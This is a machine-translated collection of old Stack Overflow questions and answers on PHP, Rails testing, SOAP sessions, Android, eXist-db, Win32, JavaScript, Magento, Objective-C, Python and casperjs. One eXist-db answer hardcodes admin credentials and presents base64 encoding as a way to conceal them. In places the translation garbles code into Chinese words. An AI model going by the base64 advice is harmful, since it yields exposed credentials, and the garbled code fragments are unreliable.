  $y = $r * sin(deg2rad($angle)); // Y coordinates
  return $y;
}

echo round(positionX(4,1))."<br>";
echo round(positionY(4,1))."<br><br>";

echo round(positionX(4,2))."<br>";
echo round(positionY(4,2))."<br><br>";

echo round(positionX(4,3))."<br>";
echo round(positionY(4,3))."<br><br>";

echo round(positionX(4,4))."<br>";
echo round(positionY(4,4))."<br><br>"; 
```

结果：

```
0
1000

-1000
0

-0
-1000

1000
-0 
```

# ruby-on-rails - RSpec、Capybara、JavaScript 测试未正确回滚数据库

> ID：13530619
> 
> 赞同：1
> 
> 时间：2012-11-23T14:00:42.377
> 
> 标签：ruby-on-rails, ruby, rspec, ruby-on-rails-3.2, capybara

所以，我正在测试我的 Ruby on Rails 项目，但我遇到了数据库问题。

我正在使用 Stripe，并且我正在根据用户的购买体验为每个页面运行集成测试。在运行测试之后，我的数据库并没有回滚！

这非常令人沮丧，因为每次测试后我都需要运行`rake db:test:prepare`，这让我放慢了速度。

以下是我的规范的代码：

```
require 'spec_helper'

describe "Subscription Pages" do
  subject { page }

  ...

  describe "purchase page" do

  ...

  describe "when not signed in" do
    it { should have_field "Email" }
    it { should have_field "Full Name" }
    it { should have_field "Password" }
    it { should have_field "Confirmation" }

    describe "and fills in the provided sign-up form as new user" do
      let(:some_user){ FactoryGirl.build(:user) }
      before do
        fill_in "Full Name",             with: some_user.name
        fill_in "Email",                 with: some_user.email
        fill_in "Password",              with: some_user.password
        fill_in "Confirmation",          with: some_user.password
        fill_in "card_number",           with: "4242424242424242"
        fill_in "card_code",             with: "123"
        select "January", from: "card_month"
        select (Date.today.year+1).to_s, from: "card_year"
      end

      ...

      describe "and submits with valid information", js: true do
        before do
          click_button submit
          sleep 5
        end

        it { should have_selector('div.alert.alert-success', text: 'Thank you for purchasing!') }
        it { should have_field "Words" } # because its the new puzzle page.
        it { should_not have_link "Buy Now!", href: plans_path }

        describe "and then tries to revisit the purchase page", js: true do
          before do
            visit purchase_path
          end

          # Should redirect to account screen with an alert
          # These tests pass when I do them myself but don't know why they are failing here
          specify { User.find_by_email(some_user.email).subscription.paid_user?.should be_true }

          it { should have_selector( 'title', text: "Account") }
          it { should_not have_field "card_number" }
          it { should have_selector('div.alert.alert-notify') }
          it { should_not have_link "Buy Now!", href: plans_path }
        end
      end
    end
  end
end 
```

结尾

如果我从运行开始`rake db:test:prepare`，然后运行测试，一切都很好。但是，当我再次运行测试时，由于数据库没有回滚，我的用户模型上出现“电子邮件已接收”验证错误。

我在这里做错了什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-23T17:16:26.833

请注意，虽然 :rack_test 是 Capybara 用于常规测试的默认驱动程序，但 javascript 测试使用不同的驱动程序 (:selenium) 执行，该驱动程序[不支持事务性固定装置](https://stackoverflow.com/questions/5524500/why-does-my-cucumber-test-fail-when-run-with-selenium)（[没有一些解决方法](https://stackoverflow.com/questions/8774227/why-not-use-shared-activerecord-connections-for-rspec-selenium)）。

如果这不能解决问题，在非 javascript 块中嵌套 javascript 块（尤其是访问/单击/填充等交互式步骤）可能会在我的经验中产生不稳定的结果，所以我会避免这样做。

顺便说一句，睡眠不是一个好主意，您可能需要考虑`wait_until`和`wait_for_ajax`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T14:14:30.980

确保你有

```
config.use_transactional_fixtures = true 
```

小时`spec/rspec_helper.rb`

此外，不确定您在示例中省略了哪些代码，但是您在其中创建的任何内容都`before(:all)`需要自己清理`after(:all)`，因为这是在打开事务之前调用的。

# php - PHP - 奇怪的会话错误

> ID：13530627
> 
> 赞同：1
> 
> 时间：2012-11-23T14:01:01.977
> 
> 标签：php, session

我在 PHP 中通过 SOAP 使用外部 API。此 API 的正常工作流程是：

*   认证（）;
*   搜索任何你想要的
*   session_close();

按照手册中的说明，我的小 SOAP 客户端执行此操作：

```
$auth_url  = "http://search.isiknowledge.com/esti/wokmws/ws/WOKMWSAuthenticate?wsdl";
$auth_client = @new SoapClient($auth_url,$Options);
$auth_response = $auth_client->authenticate();

$search_url = "http://search.isiknowledge.com/esti/wokmws/ws/WokSearchLite?wsdl";
$search_client = @new SoapClient($search_url,$Options);
$search_client->__setCookie('SID',$auth_response->return);

$search_array = array(
  'queryParameters' => array(
    'databaseID' => 'WOS',
    'userQuery' => 'TS=Medical Informatics',
    'editions' => array(
      array('collection' => 'WOS', 'edition' => 'SSCI'),
      array('collection' => 'WOS', 'edition' => 'SCI')
    ),
    'queryLanguage' => 'en'
  ),
  'retrieveParameters' => array(
    'count' => '99',
    'fields' => array(
      array('name' => 'Date', 'sort' => 'D')
    ),
    'firstRecord' => '1'
  )
);

try{
  $search_response = $search_client->search($search_array);
} catch (Exception $e) {
    echo $e->getMessage();
}

var_dump($search_response);

$auth_client->closeSession(); 
```

现在对于奇怪的行为：

当我加载这个小的 PHP 脚本时，它有时可以工作，有时不能。当它正常工作时，它会正确输出找到的数据，而当它没有时，我会得到类似“找不到会话：SID=I2b45baEdoaOLpOE4J8 NodeID=I2”的信息。

我注意到了几件事。总是在它一次不工作之后，下一次重新加载它将完全工作，当我每分钟重新加载脚本几次时，它会因上述消息而制动，还将“计数”参数从 99 更改为 100，这应该是最大值根据手册将始终失败并使用上述错误消息使脚本制动。这怎么可能，我能做些什么来解决这个问题？

手册仅说当没有要删除的会话时会出现此消息，因为该会话已被删除。但怎么可能呢？我的意思是我总是在脚本结束时关闭会话，有时会话在之前关闭，所以会出现错误，说明会话已经关闭？

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-09T20:35:18.830

问题已解决，对于将来可能遇到相同问题的每个人来说，这里是解决方案：

问题是生成的会话 ID 有时在 ID 字符串中包含一个 @。因此@ 不会被 PHP 中的 Soap 类自动转义。您必须使用以下方法疯狂地“逃脱”它：

```
$search_client->__setCookie('SID','"' . $auth_response->return . '"'); 
```

通过使用它， $auth_response->return 完全用作字符串，并且 Soap 类可以继续工作而不会出现任何错误。如果不这样做，Soap 类只会将会话 ID 传递到 @，停止使用 @ 之后的其余会话 ID。

希望这可以帮助某人。

# android - 从我的 Android 应用程序播放 MP4 非常不稳定

> ID：13530631
> 
> 赞同：2
> 
> 时间：2012-11-23T14:01:22.077
> 
> 标签：android, video, mp4

我的 Hackberry 板与 Android 4.0.4 有一个奇怪的问题，我必须全屏播放视频，但视频非常不稳定，如果从我的应用程序播放，速度非常慢。如果我在默认媒体播放器上播放相同的 mp4 视频，一切都很好而且很快。我的三星 S3 上的相同 apk 在应用程序和媒体播放器中也很快。

这是我的布局

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent" >

    <VideoView
           android:id="@+id/surface_view"
           android:layout_width="match_parent"
           android:layout_height="match_parent"
           android:layout_centerInParent="true"/>

</RelativeLayout> 
```

这是我用来播放视频的代码

```
super.onCreate(savedInstanceState);
setContentView(R.layout.activity_main);

mVideoView = (VideoView) findViewById(R.id.surface_view);
mVideoView.setVideoURI(Uri.parse("android.resource://" + getPackageName() +"/"+R.raw.decart));
mVideoView.setMediaController(new MediaController(this));
mVideoView.requestFocus();
mVideoView.start(); 
```

和清单

```
<uses-sdk
    android:minSdkVersion="14"
    android:targetSdkVersion="15" />

<application
    android:icon="@drawable/ic_launcher"
    android:label="@string/app_name"
    android:hardwareAccelerated="true"
    android:theme="@android:style/Theme.NoTitleBar.Fullscreen"
    android:persistent="true" 
    android:largeHeap="true" >

    <activity
        android:name=".MainActivity"
        android:screenOrientation="landscape"
        android:label="@string/app_name" >
        <intent-filter>
            <action android:name="android.intent.action.MAIN" />
            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
    </activity>

</application> 
```

任何想法？

我也做了一个测试，如果我把我的视频放在 SD-CARD 中一切正常，如果我使用原始资源文件夹中的文件，我的视频就有问题。以下似乎是解决方案，但对我来说不是一个好的解决方案。

```
//NOT OK
mVideoView.setVideoURI(Uri.parse("android.resource://" + getPackageName() +"/"+R.raw.decart));

// OK
mVideoView.setVideoURI(Uri.parse(new File("/sdcard/decart.mp4").toString())); 
```

向大家致以最诚挚的问候

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-02T18:41:11.493

据我了解这里的问题与视频本身无关。这只是您可以从两个来源获得的吞吐量。android.resource:// 的东西似乎有性能问题，简单的文件访问没有。

您可以尝试简单地从两个来源读取文件，测量读取速度，看看罪魁祸首是否真的是 I/O 吞吐量。

# xml - 使用 xquery 存在数据库用户注册

> ID：13530635
> 
> 赞同：2
> 
> 时间：2012-11-23T14:01:28.423
> 
> 标签：xml, xquery, exist-db

我正在尝试创建用户注册表单并在注册时创建集合。我尝试了以下代码，但是当我尝试执行时出现此错误： **HTTP 400 Bad Request** and page cannot be displayed。这是代码：

```
xquery version "1.0";

declare namespace request="http://exist-db.org/xquery/request";
declare namespace response="http://exist-db.org/xquery/response";
declare namespace xdb="http://exist-db.org/xquery/xmldb";
declare option exist:serialize "method=xhtml media-type=text/html indent=yes";
declare variable $database-uri as xs:string { "xmldb:exist:///db" };
declare variable $redirect-uri as xs:anyURI { xs:anyURI("login.xql") };

   declare function local:header() as node(){
<div style="background-color:#b0c4de; padding: 20px; border: 1px solid black;">
<h1>test</h1>
</div>
};

declare function local:footer() as node(){
<div style="background color:#eee; height: 1%; padding:20px; border: 1px solid black;">
<p>PROJECT</p>
</div>
};      

declare function local:reg($user as xs: string) as element()?
{
let $password := request:get-parameter("password", "")
let $password2 := request:get-parameter("password2", "")
return
    if (not(xdb:exists-user($user))) then ( 
    xdb:create-collection($database-uri, $user),
    xdb:create-user($user, $password, "guest", ()),
    response:redirect-to($redirect-uri)
    ) else
        <p>User already exists!</p>
};

declare function local:do-reg() as element()?
{
    let $user := request:get-parameter("user", ())
    return
        <p>{$user}</p>
        if($user) then
            local:reg($user)
            else ()
};

<html>
<head><title>Registration</title>

</head>
 <body>
 {local:header()}
  <h1>Forma for reg</h1>
  <form action="{request:get-uri()}">
  User Name: <br />
  <input type="text" name="user" size="20" />
  <br />
   Password: <br />
    <input type="password" name="password" size="20" />
  <br />
   Confirm: <br />
    <input type="password" name="password2" size="20" />
  <br />

  <input type="submit" />
  <input type="reset" name="reset" value="Clear" />
  </form>
  {local:do-reg()}
  {local:footer()}
  </body>
</html> 
```

请帮忙，我是 xquery 的初学者并且存在数据库。提前致谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-27T18:54:22.163

我明白了，如果您不在 db 权限组中，则无法注册新用户。所以需要做的是为您的收藏创建一个新用户，并给他正确的权限，然后您需要使用该用户登录才能注册/创建新用户。

```
xmldb:login('/db/yourcollection', $admin, $password)
                           .
                           .
                           .
                    your registration code 
```

问题在于您将管理员用户和密码放入 .xql 文档中 - 这不是一个好主意。但是你可以使用：

> util:base64 编码

和

```
util:base64-decode 
```

对您的密码进行编码和解码。所以我是怎么做到的：

system:as-user((util:base64-decode("bXBhcmF2YWM=")),(util:base64-decode("cGFzcw==")), (
if (not(xdb:exists-user($user)) ) 然后 ( xdb:create-collection($database-uri, $user), xdb:create-user($user, $pass, 'user', ()),
response:redirect-to($redirect-uri) )别的

用户存在！

) )

还有另一种方法可以做到这一点，更安全，看看[这个例子](http://exist-db.org/exist/apps/demo/examples/urlrewriting/index.html)

# c# - 使用 Windows API 从富文本控件中检索文本的正确方法是什么？

> ID：13530637
> 
> 赞同：2
> 
> 时间：2012-11-23T14:01:32.047
> 
> 标签：c#, .net, winapi, pinvoke, sendmessage

下面的 GetRTF() 方法可以工作，但它只检索元数据：

```
 public string GetRTF(IntPtr handle)
    {
        string result = String.Empty;
        using (System.IO.MemoryStream stream = new MemoryStream())
        {
            EDITSTREAM editStream = new EDITSTREAM();
            editStream.pfnCallback = new EditStreamCallback(EditStreamProc);
            editStream.dwCookie = stream;

            SendMessage(handle, EM_STREAMOUT, SF_RTF, ref editStream);

            stream.Seek(0, SeekOrigin.Begin);
            using (StreamReader reader = new StreamReader(stream))
            {
                result = reader.ReadToEnd();
            }
        }
        return result;
    }

    private int EditStreamProc(MemoryStream dwCookie, IntPtr pbBuff, int cb, out int pcb)
    {
        pcb = cb;
        byte[] buffer = new byte[cb];
        Marshal.Copy(pbBuff, buffer, 0, cb);
        dwCookie.Write(buffer, 0, cb);
        return 0;
    }

    private delegate int EditStreamCallback(MemoryStream dwCookie, IntPtr pbBuff, int cb, out int pcb);

    [StructLayout(LayoutKind.Sequential)]
    private struct EDITSTREAM
    {
        public MemoryStream dwCookie;
        public int dwError;
        public EditStreamCallback pfnCallback;
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    private static extern IntPtr SendMessage(IntPtr hwnd, uint msg, uint wParam, ref EDITSTREAM lParam);

    private const int WM_USER = 0x0400;
    private const int SF_RTF = 2;
    private const int EM_STREAMOUT = WM_USER + 74; 
```

因此，当我使用富文本控件的句柄调用 GetRTF() 时，返回值为：

```
 {\rtf1\ansi\ansicpg1252\deff0\nouicompat\deflang1033{\fonttbl{\f0\fnil\fprq2\fcharset0 Tahoma;}}{\colortbl ;\red59\green59\blue59;}{\*\generator Riched20 14.0.6015.1000;}{\*\mmathPr\mwrapIndent1440}\viewkind4\uc1\pard\cf1\f0\fs17{\pict\wmetafile0}} 
```

但这不是富文本控件显示的文本（它只是一个电子邮件地址）。

检索我正在寻找的数据的正确方法是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T18:40:03.633

您的代码已经检索到所有数据。那是控件内容的 RTF 表示。没有文本，因为您的控件中没有任何文本。它似乎只包含一个元文件矢量图像。

如果您向该控件发送`WM_GETTEXT`消息以获取纯文本，那么您将一无所获。因为控件不包含文本，只有图像。

# javascript - Window.open 调整到可用的宽度和高度

> ID：13530641
> 
> 赞同：5
> 
> 时间：2012-11-23T14:01:45.940
> 
> 标签：javascript, jquery, fullscreen, window.open

我做了一些搜索，但我看不出这是否可能。我想使用该`window.open()`方法打开指向窗口可用宽度和高度的链接。类似于下面的代码。

```
var h = $(window).height(); 
var w = $(window).width(); 

$('#window-opener').live('click',function (e) {
        window.open(this.href, 'Resource', 'toolbar=no ,location=0, status=no, titlebar=no, menubar=no,
                    width='+w', 
                    height='+h);
        e.preventDefault();
}); 
```

这可能吗？如果没有，任何人都可以推荐一种做类似事情的方法。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-23T14:31:35.130

您的代码是正确的，仅在宽度连接后缺少一个 ' ：

```
width='+w', 
```

一定是

```
width='+ w +', 
```

我试过这个，也许我不明白你真的想要做什么：

```
var h = screen.height;
var w = screen.width;

$('#window-opener').live('click',function (e) {
    window.open(this.href, 'Resource', 'toolbar=no ,location=0, 
    status=no,titlebar=no,menubar=no,width='+w +',height=' +h);
    e.preventDefault();
});​ 
```

小提琴：http: [//jsfiddle.net/UC8Ww/](http://jsfiddle.net/UC8Ww/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-23T14:29:37.360

因为你正在构建错误的字符串。

```
width='+w',height='+h); 
```

你看到你错过了什么吗？希望你看到失踪`+`

# magento - 从块 Magento 操作模板

> ID：13530642
> 
> 赞同：1
> 
> 时间：2012-11-23T14:01:46.603
> 
> 标签：magento

我正在尝试更改目录页面中 AddtoCart 按钮的行为，并仅在特定情况下显示它。我正在做的是添加一个自定义模块来更新布局并用我自己的文件替换 Product/List.phtml。这种方法在发布自定义模块时不是很灵活，因为几乎所有用户都将使用不同的模板文件，他们必须将我的模板文件与他们的模板文件合并。

所以我的问题是我可以从块中操作 phtml，也许覆盖 *Mage_Catalog_Block_Product_List* 并更改 *_BeforeToHtml* 函数中的模板，这是一个更好的方法，是否可行？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T14:43:59.203

首先让我先说 Magento 在这方面缺乏一点灵活性（在渲染到模板时）。如果我对您的理解正确，则您正在确定产品是否可销售：

*   您可以添加要关注的事件`catalog_product_is_salable_after`。通过这种方式，您可以在系统内设置产品是否可供销售。当您更改`salable` `Varien_Object`事件中的值时，它将更改为缺货消息。也许这就是您想要的（但问题是它在`if/else`语句中使用 - 它可以添加到购物车中，或者缺货（参见下面的代码）。
*   然后，您可以使用翻译文件将*Out of Stock*更改为您想要的字符串（一种 hack）。
*   尝试覆盖的问题`Mage_Catalog_Block_Product_List`是模板文件在该`_toHtml`方法之前甚至不包含在内。您可以覆盖它，并`parent::_toHtml()`在代码块的开头调用。但是，删除添加到购物车按钮将涉及一些非常困难的正则表达式。

这是块代码。它确实有点粘。

```
<?php if($_product->isSaleable()): ?>
    <button type="button" title="<?php echo $this->__('Add to Cart') ?>" class="button btn-cart" onclick="setLocation('<?php echo $this->getAddToCartUrl($_product) ?>')"><span><span><?php echo $this->__('Add to Cart') ?></span></span></button>
<?php else: ?>
   <p class="availability out-of-stock"><span><?php echo $this->__('Out of stock') ?></span></p>
<?php endif; ?> 
```

# vb.net - vb.net 服务提示音

> ID：13530644
> 
> 赞同：0
> 
> 时间：2012-11-23T14:01:56.027
> 
> 标签：vb.net, audio, service

我正在做的一个项目需要计算机发出声音。

这是用 VB.NET 编写的服务。由于这台计算机将使用的位置和环境，如果出现问题（计算机不在网络上），电子邮件或其他通知将不起作用。

该服务需要一种方法来提醒人们出现问题，因此声音似乎是合乎逻辑的选择。

当程序作为服务运行时，对 System.Console.Beep 的调用不起作用。我还发现这篇[文章](https://stackoverflow.com/questions/1286194/how-can-i-make-a-windows-service-beep)看起来与我遇到的问题相同，但它包含的关于如何使用名为“IOCTL_BEEP_SET”的东西的链接已损坏，并且相当多的谷歌搜索未能产生任何答案。

有没有人知道如何使 Windows 服务（用 VB.NET 编写）发出哔哔声？或者，知道计算机除了声音之外还有什么方法可以引起别人的注意？（系统可能未登录，屏幕可能会关闭，并且不在网络上）

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T04:38:31.417

不小心我的电脑工作了。我正在使用 Windows 7 Ultimate。但它与另一个桌面交互。看一下这个

[http://www.brianbondy.com/blog/id/100/understanding-windows-at-a-deeper-level-sessions-window-stations-and-desktops](http://www.brianbondy.com/blog/id/100/understanding-windows-at-a-deeper-level-sessions-window-stations-and-desktops)

[http://msdn.microsoft.com/en-us/library/windows/desktop/ms687105(v=vs.85).aspx](http://msdn.microsoft.com/en-us/library/windows/desktop/ms687105(v=vs.85).aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-24T03:46:37.807

我认为您的服务没有与 desktop.goto 服务属性交互并手动设置它。 ![在此处输入图像描述](../Images/9848518df5d2df5f950a660867835c54.png)

试试看 ：）

然后尝试

```
Console.Beep(); 
```

# android - 带有 Spinner 的 ArrayAdapter 返回 android.content.res.Resources$NotFoundException

> ID：13530648
> 
> 赞同：0
> 
> 时间：2012-11-23T14:02:26.973
> 
> 标签：android, spinner, android-arrayadapter, android-spinner, android-resources

我试图用字符串列表填充 Spinner。他在android中编译并运行，但是当我在Spinner中输入触摸时，程序停止并返回此错误：

android.content.res.Resources$NotFoundException：资源 ID #0x7f090003 类型 #0x12 无效

```
protected void onPostExecute(List<String> myList)
        {
            if (!myList.isEmpty())
            {
                ArrayAdapter<String> adp = new ArrayAdapter<String>(MyActivity.this, android.R.layout.simple_spinner_item, myList);
                adp.setDropDownViewResource(R.id.mySpinner);
                mySpinner.setAdapter(adp);
            }
            else
            {
                Toast.makeText(getApplicationContext(), "Warning.", Toast.LENGTH_SHORT).show();
                Intent i = new Intent(myActivity.this, Preferences.class);
                startActivity(i);
            }
        } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-23T14:07:37.910

I think `setDropDownViewResource` method expects a layout resource ID.

You should replace

```
adp.setDropDownViewResource(R.id.mySpinner); 
```

by

```
adp.setDropDownViewResource(R.layout.mySpinner); 
```

And make sure (of course) that the file `res/layout/mySpinner.xml` exists

Or just use a default layout from the SDK:

```
adp.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item); 
```

# jsf - JSF: call backing-bean method without rendering the page (using URL parameters)

> ID：13530651
> 
> 赞同：1
> 
> 时间：2012-11-23T14:02:30.567
> 
> 标签：jsf, primefaces

Is it possible to use a **JSF** (PrimeFaces) page in the following fashion ? :

1.  external application (not **JSF**-based) does an **HTTP GET** with **URL** parameters
2.  **JSF** page reads those parameters (e.g. as described [here](https://stackoverflow.com/questions/10724428/how-do-i-process-url-parameters-on-page-load-using-primefaces)) and invokes a backing bean business method, without rendering anything to the user's browser
3.  The user is transparently sent to a page corresponding to the navigation outcome of the backing bean method invoked in step 2.

In other words, the **PrimeFaces** page of step ***2*** is involved only for the side effect of calling the backing-bean business method and is never displayed. The user after clicking on a link on the external application of step ***1*** lands in the page of step ***3***.

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-23T14:14:09.423

Use [`<f:viewParam>`](http://docs.oracle.com/javaee/6/javaserverfaces/2.1/docs/vdldocs/facelets/f/viewParam.html) to set GET parameters as bean properties and use [`<f:event>`](http://docs.oracle.com/javaee/6/javaserverfaces/2.1/docs/vdldocs/facelets/f/event.html) to execute a bean action and use [`NavigationHandler`](http://docs.oracle.com/javaee/6/api/javax/faces/application/NavigationHandler.html) to perform navigation programmatically.

View:

```
<f:metadata>
    <f:viewParam name="foo" value="#{bean.foo}" />
    <f:viewParam name="bar" value="#{bean.bar}" />
    <f:event type="preRenderView" listener="#{bean.action}" />
</f:metadata> 
```

Bean:

```
public void action() {
    // ...

    FacesContext context = FacesContext.getCurrentInstance();
    NavigationHandler navigationHandler = context.getApplication().getNavigationHandler();
    navigationHandler.handleNavigation(context, null, "outcome");
} 
```

Note that, depending on the concrete functional requirement, JSF might not necessarily be the right tool for the job. I'd investigate if you couldn't better use a [servlet filter](https://stackoverflow.com/tags/servlet-filters/info) or even a plain [servlet](https://stackoverflow.com/tags/servlets/info) for the purpose.

### See also:

*   [What can <f:metadata>, <f:viewParam> and <f:viewAction> be used for?](https://stackoverflow.com/questions/6377798/what-can-fmetadata-and-fviewparam-be-used-for)
*   [Hit a bean method and redirect on a GET request](https://stackoverflow.com/questions/7488211/jsf-how-to-hit-a-bean-method-and-redirect-based-on-a-get-variable)

# objective-c - 属性类型与访问器类型不匹配（子类化时）

> ID：13530658
> 
> 赞同：1
> 
> 时间：2012-11-23T14:02:46.303
> 
> 标签：objective-c, inheritance, properties

好的，我知道这个主题之前在 SO 上已经提到过很多次，但是在检查了几个这样的问题之后，没有人谈到我在覆盖子类中的基类 getter/setter 时遇到的问题。

我的基类是：

```
#import <Foundation/Foundation.h>
@interface BaseClass : NSObject
@property (nonatomic, assign) int value;
@end

@implementation BaseClass
@synthesize value;
@end 
```

从那我希望子类充当垫片并将“值”从 int 映射到我的子类中的枚举：

```
#import <UIKit/UIKit.h>
#import "BaseClass.h"

typedef enum {
    zero = 0,
    one,
    two,
    three,
    four
} NumberEnum;

@interface ChildClass : BaseClass
-(void)setValue:(NumberEnum)newValue;
-(NumberEnum)value;
@end

@implementation ChildClass

-(void)setValue:(NumberEnum)newValue
{
    [super setValue:(int)newValue];
    NSLog(@"Child Setter");
}

-(NumberEnum)value
{
    NSLog(@"Child Getter");
    return (NumberEnum)[super value];
}

@end 
```

我使用以下代码测试此代码：

```
ChildClass* fred = [[ChildClass alloc] init];
NumberEnum barney;
fred.value = one;
barney = fred.value;
barney = [fred value]; 
```

XCode (4.5.2) 生成警告

> 属性“值”的类型与访问器“值”的类型不匹配

**仅**在这一行：

```
barney = fred.value; 
```

运行代码时，我看到了 Child Setter 和 Getter 的日志消息。那么我应该怎么做才能消除这个警告，为什么我首先得到它？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T14:06:31.070

Your `@property` says `int` and the compiler is probably messing up with your methods. Try setting the `@property` type to `NumberEnum` and it should work (you will need to move the enum definition to your .h)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T15:55:32.990

违规行：

```
barney = fred.value; 
```

告诉编译器您要使用该属性`value`。由于您的子类没有定义它，它会上升到基类。它发现`value`导致警告的类型不同。

一个解决方案是将您的属性写为：

```
@property (nonatomic, assign) int value; 
```

和枚举为：

```
enum {
    zero = 0,
    one,
    two,
    three,
    four
};
typedef int NumberEnum; 
```

这样合成的属性方法和您自己的实现使用相同的数据类型。您可以使用符号值并且没有警告。

我建议`NSUInteger`改用它，因为它是 64 位友好的。

当然，如果您只是`NumberEnum`在基类中定义属性，那就更好了。

# python - Python：从其他脚本读取和执行行（或复制它们）？

> ID：13530660
> 
> 赞同：0
> 
> 时间：2012-11-23T14:02:48.740
> 
> 标签：python, file, parsing, file-io, import

考虑一个python脚本：

```
####
#Do some stuff#

####
#Do stuff from separate file

####
#Do other stuff 
```

实现中间位的最佳方法是什么（做在另一个文件中定义的东西）？有人告诉我，在 C++ 中有一个命令可以实现我想要做的事情。Python中是否有等价物？

例如，如果 A.py 是：

```
print 'a'

### import contents of other file here

print 'm' 
```

B.py 是：

```
print 'b'
print 'c'
print 'd' 
```

那么 A.py 的期望输出是：

```
a
b
c
d
m 
```

B.py 实际上不包含打印语句，而是变量赋值和简单的流控制，它们不会与 A.py 中声明或定义的任何内容发生冲突。我知道我可以将 B.py 的内容放入一个函数中，将其导入 A.py 并在所需位置调用此函数。如果我希望 B.py 的内容返回一些单个值，那会很好。但是 B.py 的内容可能包含例如 20 个变量赋值。

我想我真正想做的不是在 A.py 中执行 B.py 的内容，而是动态修改 A.Py 以在 A.py 中的某个所需行包含 B 的内容。 py。然后，显然，执行更新的 A.py。

非常感谢您的想法和提示。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T14:14:52.300

我认为这不是一个好的编程习惯，但您可以使用[execfile](http://docs.python.org/2/library/functions.html#execfile)来执行另一个文件中的所有代码。

```
#a.py
a = a + 5

#b.py
a = 10
execfile("a.py")
print a 
```

如果你运行`b.py`它将打印'15'。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T14:06:43.720

这样做的方法是将您的代码放在函数内的 b 中并从 a 导入：

```
# b.py
def foo():
    print 'b'
    print 'c'
    print 'd'

# a.py
import b

print 'a'
b.foo()
print 'm' 
```

# objcopy - objcopy --gap-fill 仅用于特殊部分

> ID：13530661
> 
> 赞同：1
> 
> 时间：2012-11-23T14:02:58.413
> 
> 标签：objcopy

是否可以仅将 objcopy-parameter --gap-fill 用于某些特定部分？我不想用例如 0xAA 填充所有内容，因为我想在现有的 EEPROM 中保留一些旧部分。当它们被例如 0xAA 覆盖时会很糟糕。但在其他一些部分，我完全想要这种行为。

感谢您的帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-02-05T12:49:06.893

您可以使用以下命令指定填充的结束地址：--pad-to

例如：avr-objcopy.exe -I ihex -O binary --gap-fill 0xFF --pad-to 0x1FFE fkmegax8.hex fkmegax8.bin

objcopy 规范：--gap-fill val 用 val 填充部分之间的间隙。此操作适用于段的加载地址 (LMA)。这是通过增加具有较低地址的部分的大小并填充使用 val 创建的额外空间来完成的。--pad-to address 将输出文件填充到加载地址地址。这是通过增加最后一节的大小来完成的。额外的空间用 `--gap-fill' 指定的值填充（默认为零）。

我通过将它们与 srec_cat.exe 合并来组合最终的 hex 文件。

因此，如果您可以将文件逐节放在一起，则可以在每个新间隙之后放入填充字节。

# biztalk - BizTalk - WSE 3.0 适配器

> ID：13530664
> 
> 赞同：0
> 
> 时间：2012-11-23T14:03:08.877
> 
> 标签：biztalk, wse3.0

我们需要使用 BizTalk 2010 使用一个 Web 服务（这是一个 WSE3.0 服务）。我做了一些初步研究，并且不支持开箱即用的 WSE。

据我所知，我发现的唯一一件事是有一家名为 Two Connect 的公司（他们是 BizTalk 顾问）根据这篇文章做到了：

[http://geekswithblogs.net/dnodeerer/archive/2006/05/09/77731.aspx]

谁能给我一些关于如何实施它的指导？博客、文章等？或者有没有我们可以购买的产品。

谢谢！G。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-07-11T15:44:51.370

这有点晚了，但你去： http: [//fafach.wordpress.com/2013/07/03/biztalk-2010-converting-wse-send-port-to-wcf/](http://fafach.wordpress.com/2013/07/03/biztalk-2010-converting-wse-send-port-to-wcf/)

# django - 如何从 Jenkins 运行 casperjs javascript 测试？

> ID：13530669
> 
> 赞同：6
> 
> 时间：2012-11-23T14:03:23.183
> 
> 标签：django, jenkins, phantomjs, casperjs, ghost.py

我编写了一些 casperjs 测试来测试我的 Django 应用程序。如果启动了 Django 应用程序（例如在端口 8000 上），casperjs 可以作为单独的进程运行并访问我正在运行的 Django 应用程序。

我的其他测试是使用 Django 的（网络）测试框架编写的，该框架使用夹具设置测试数据库，并使用`./manage.py test`. 使用 Django webtest，您不需要启动单独的 Django 网络服务器（执行请求和 url 路由是代理/模拟的）。

有没有办法从 Django webtest 中运行 casperjs 测试？无需启动不同的网络服务器并拥有另一个测试数据库？

我已经看到 ghost.py 存在，但还没有尝试过。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-14T10:37:51.587

我设法找到了解决方案。升级到 Django 1.4 后，我可以在子进程中使用 LiveServerTestCase 和 fork casperjs：

```
from django.test.testcases import LiveServerTestCase
import os, subprocess
from subprocess import Popen, PIPE, STDOUT

class CasperTest(LiveServerTestCase):
    fixtures = ['test_initial_data', ]

    def test_my_testcase(self):
        p = Popen(['casperjs %s/caspertest.js' % os.path.dirname(__file__)], shell=True, stdout=PIPE, stderr=STDOUT, close_fds=True)
        output = p.stdout.read()
        print output 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-05-25T21:07:33.077

你应该看看[django-casper](https://github.com/dobarkod/django-casper)。几天前我开始使用它，它真是太棒了！

# jquery - 谁能弄清楚为什么我的 carouFredsel 在 Webkit 中不起作用？

> ID：13530670
